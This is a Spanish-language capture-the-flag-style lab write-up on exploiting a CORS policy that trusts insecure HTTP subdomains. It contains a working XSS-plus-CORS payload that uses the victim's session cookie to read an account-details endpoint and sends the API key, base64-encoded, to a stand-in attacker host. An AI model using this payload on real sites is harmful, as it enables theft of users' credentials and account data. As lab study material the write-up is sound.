# CORS con protocolos inseguros confiables

Tags: #CORS 

```bash 
En este lab se aprovecha la funcionalidad vulnerable de la aplicación, donde una URL en HTTP ejecuta un script inyectado a través de un parámetro. Este script lanza una solicitud 'XMLHttpRequest' a un endpoint protegido, obteniendo la clave API del administrador gracias a que el origen inseguro en HTTP sigue siendo aceptado por el servidor. El resultado se redirige al servidor de explotación, permitiendo capturar y enviar la clave para completar el laboratorio.


- Access-Control-Allow-Credentials 'True': Permite que el navegador envíe cookies, tokens de sesión u otros datos de autenticación en la solicitud

- Access-Control-Allow-Origin: En este lab se permitirán los subdmonios para que esta cabecera aparezca en la respuesta 
```

```javascript 
// Utilizando un subdominio de la misma web en la cual existe un XSS se puede hacer que al momento de ingresar a la web maliciosa esta redirija a la víctima al subdominio permitido para que se ejecute lo que se encuentra en el XSS 

<script>
document.location = "http://stock.web.com/?productId=<script>
	var req = new XMLHttpRequest();
	req.onload = function() {
		location = 'https://maliciousWeb.com/?apiKey=' + btoa(req.responseText);   // Forzar a la víctima a que tramite una solicitud por GET al servidor de atacante para que envie el contenido de la respuesta en base64
	};
	req.open('GET', 'https://web.com/accountDetails', true);
	req.withCredentials = true;    // Arrastrar la cookie de sesión de la víctima 
	req.send();
</script>&storeId=1";
</script>


Notas:
	1. Necesitas una sesión activa de la víctima que visita la página maliciosa 
	2. req.open(true) = Asíncrona para que no continue el flujo hasta que no se tenga la respuesta 
	3. Se debe de encodear el '+' = %2b
	4. El dominio se debe de enviar por http
```

```bash 
❯ echo -n 'base64Code' |  base64 -d | jq 

	# base64 -d = Decodear el código que se encuentra en base64 
	# jq = Procesar la data en Json 
```